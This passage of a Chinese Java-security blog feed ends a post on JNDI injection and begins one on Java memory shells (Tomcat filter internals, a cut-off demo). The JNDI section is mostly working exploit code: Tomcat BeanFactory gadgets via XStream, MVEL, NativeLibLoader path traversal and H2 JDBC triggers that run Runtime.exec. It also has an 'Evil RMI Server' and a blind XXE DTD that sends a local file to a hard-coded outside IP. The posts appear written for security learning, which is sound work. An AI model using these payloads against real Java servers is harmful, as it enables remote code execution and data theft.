&lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;/implementing__method&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &lt;/probes&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;      &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  &lt;/java.util.PriorityQueue&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&lt;/java.util.PriorityQueue&gt;&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=fromXML&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, xml));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MVEL">MVEL</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_MVEL</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.mvel2.sh.ShellSession&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=exec&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>,</span><br><span class="line">            <span class="string">&quot;push Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;);&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nativelibloader">Nativelibloader</h2><p><code>com.sun.glass.utils.NativeLibLoader</code>是JDK的类，它有一个<code>loadLibrary(String)</code>方法。</p><p>它会去加载指定路径的动态链接库文件，所以只要能够通过WEB功能或者写文件gadget上传一个动态链接库就可以用<code>com.sun.glass.utils.NativeLibLoader</code>来加载并执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_loadLibrary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=loadLibrary&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;/../../../../../../../../../../../../tmp/libcmd&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xxe">xxe</h2><p>它会根据pathname去发起本地或者远程文件访问，并使用 commons-digester 解析返回的 XML 内容，所以这里可以 XXE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.apache.catalina.UserDatabase&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>,<span class="string">&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;</span>,<span class="literal">null</span> );</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;pathname&quot;</span>, <span class="string">&quot;http://192.227.165.134/xxe.xml&quot;</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xxe盲注payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.227.165.134/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://D://flag.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.227.165.134:8888/1.txt?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="jdbc">jdbc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">tomcat_dbcp2_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">tomcat_dbcp1_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">commons_dbcp2_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">commons_dbcp1_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">dbcpByFactory</span><span class="params">(String factory)</span>&#123;</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;root&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;password&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>四种不同版本的 dbcp 要用不同的工厂类</p><p>如果遇到使用的不是 Tomcat 或没有 dbcp 时就可以尝试换成 commons-dbcp。</p><h3 id="tomcat-jdbc">tomcat-jdbc</h3><p>如果遇到 dbcp 使用不了时，可以使用 tomcat-jdbc.jar 的 <code>org.apache.tomcat.jdbc.pool.DataSourceFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">tomcat_JDBC_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dbcpByFactory(<span class="string">&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">dbcpByFactory</span><span class="params">(String factory)</span>&#123;</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,factory,<span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;root&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;password&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="druid-jdbc">druid-jdbc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">druid</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>,<span class="string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,JDBC_USER));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,JDBC_PASSWORD));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;init&quot;</span>,<span class="string">&quot;true&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget">http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E5%88%A9%E7%94%A8LDAP%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html">https://www.cnblogs.com/bitterz/p/15946406.html</a></p><p><a href="https://forum.butian.net/share/1895">https://forum.butian.net/share/1895</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SP</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="注入" scheme="https://oceanzbz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
    <category term="JNDI" scheme="https://oceanzbz.github.io/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>Java内存马</title>
    <link href="https://oceanzbz.github.io/post/9c64f02b.html"/>
    <id>https://oceanzbz.github.io/post/9c64f02b.html</id>
    <published>2024-12-30T05:31:32.000Z</published>
    <updated>2025-03-05T07:24:36.791Z</updated>
    
    <content type="html"><![CDATA[<p>开启一个补漏的篇章，内存只是听说过还从来没有细细学过。本篇就记录下自己学习java内存马的过程。</p><h2 id="1-前置基础">1.前置基础</h2><p>在开始学下之前我们先来了解什么是servlet容器，这里以tomcat为例。</p><p>web容器的概念参考：<a href="https://blog.csdn.net/hzk1562110692/article/details/94295947">https://blog.csdn.net/hzk1562110692/article/details/94295947</a></p><p>tomcat原理参考：</p><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p><p><a href="https://tuonioooo-notebook.gitbook.io/performance-optimization/webrong-qi-you-hua/tomcatrong-qi-you-hua-pian/tomcatrong-qi-nei-bu-yuan-li">https://tuonioooo-notebook.gitbook.io/performance-optimization/webrong-qi-you-hua/tomcatrong-qi-you-hua-pian/tomcatrong-qi-nei-bu-yuan-li</a></p><p><a href="https://maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li">https://maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li</a></p><p>这两篇文章大致介绍了请求 响应流程</p><p>tomcat源码调试参考：<a href="https://blog.csdn.net/zhuiyisinian/article/details/105617138">https://blog.csdn.net/zhuiyisinian/article/details/105617138</a></p><p>这里参考<a href="https://xz.aliyun.com/t/13638">https://xz.aliyun.com/t/13638</a> 该文章以及tomacat原理参考中的第一篇文章详细记录下</p><p>我这里直接copy<a href="https://xz.aliyun.com/t/13638">https://xz.aliyun.com/t/13638</a> 这篇文章。但还是要结合上面tomcat参考的看一下更清楚流程。</p><p>Tomcat设计了四种容器，分别是Engine、Host、Context和Wrapper，其关系如下：<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714812004673-e793f486-f91c-4297-b7e7-8fdde01b71a9.png" alt=""></p><p>此时，设想这样一个场景：我们此时要访问<a href="https://manage.xxx.com:8080/user/list%EF%BC%8C%E9%82%A3tomcat%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E8%AF%B7%E6%B1%82%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%85%B7%E4%BD%93%E7%9A%84servlet%E7%9A%84%E5%91%A2%EF%BC%9F%E4%B8%BA%E6%AD%A4tomcat%E8%AE%BE%E8%AE%A1%E4%BA%86Mapper%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%BF%9D%E5%AD%98%E4%BA%86%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E4%B8%8E%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB%E3%80%82">https://manage.xxx.com:8080/user/list，那tomcat是如何实现请求定位到具体的servlet的呢？为此tomcat设计了Mapper，其中保存了容器组件与访问路径的映射关系。</a></p><p>然后就开始四步走：</p><ol><li>根据协议和端口号选定Service和Engine。我们知道Tomcat的每个连接器都监听不同的端口，比如Tomcat默认的HTTP连接器监听8080端口、默认的AJP连接器监听8009端口。上面例子中的URL访问的是8080端口，因此这个请求会被HTTP连接器接收，而一个连接器是属于一个Service组件的，这样Service组件就确定了。我们还知道一个Service组件里除了有多个连接器，还有一个容器组件，具体来说就是一个Engine容器，因此Service确定了也就意味着Engine也确定了。</li><li>根据域名选定Host。Service和Engine确定后，Mapper组件通过url中的域名去查找相应的Host容器，<a href="http://xn--urlmanage-pl6nj4j1rsi7lprfbxhoy2cubuh57bda3189hhyzb.xxx.com">比如例子中的url访问的域名是manage.xxx.com</a>，因此Mapper会找到Host1这个容器。</li><li>根据url路径找到Context组件。Host确定以后，Mapper根据url的路径来匹配相应的Web应用的路径，比如例子中访问的是/user，因此找到了Context1这个Context容器。</li><li>根据url路径找到Wrapper（Servlet）。Context确定后，Mapper再根据web.xml中配置的Servlet映射路径来找到具体的Wrapper和Servlet，例如这里的Wrapper1的/list。</li></ol><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714813938267-fbd3b097-e9fd-4279-bae3-af15bf6b2625.png" alt=""></p><p>以上是参考别人的，下面用自己的话简单概括一下：</p><p>就是说连接器负责监听外界的请求然后将请求封装成servlet对象发送给engine在由engin的Mapper根据url等信息去调用context在去调用wrapper再去调用具体servlet</p><h2 id="2-传统内存马">2.传统内存马</h2><h3 id="2-1Filter-内存马">2.1Filter 内存马</h3><p>filter 也称之为过滤器，是对 Servlet 技术的一个强补充，其主要功能是在 HttpServletRequest 到达 Servlet 之前，拦截客户的 HttpServletRequest ，根据需要检查 HttpServletRequest，也可以修改 HttpServletRequest 头和数据；在 HttpServletResponse 到达客户端之前，拦截 HttpServletResponse ，根据需要检查 HttpServletResponse，也可以修改 HttpServletResponse 头和数据。</p><p>工作原理如图所示：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714821706305-574612a8-d1bc-4d2e-88dc-a08789fa38db.png" alt=""></p><p>在调试分析之前还是说一句能尽量看看tomact的源码分析就多看看。</p><p>首先看一下filter内存马用的主要几个方法：</p><ul><li>FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</li><li>FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</li><li>FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</li><li>FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</li><li>WebXml：存放 web.xml 中内容的类</li><li>ContextConfig：Web应用的上下文配置类</li><li>StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</li><li>StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</li></ul><p>下面我们写一个filter的demo看一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcat_demo_neicunma;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterdemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">        System.out.println(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;diaoyong filter&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在配置一下web.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 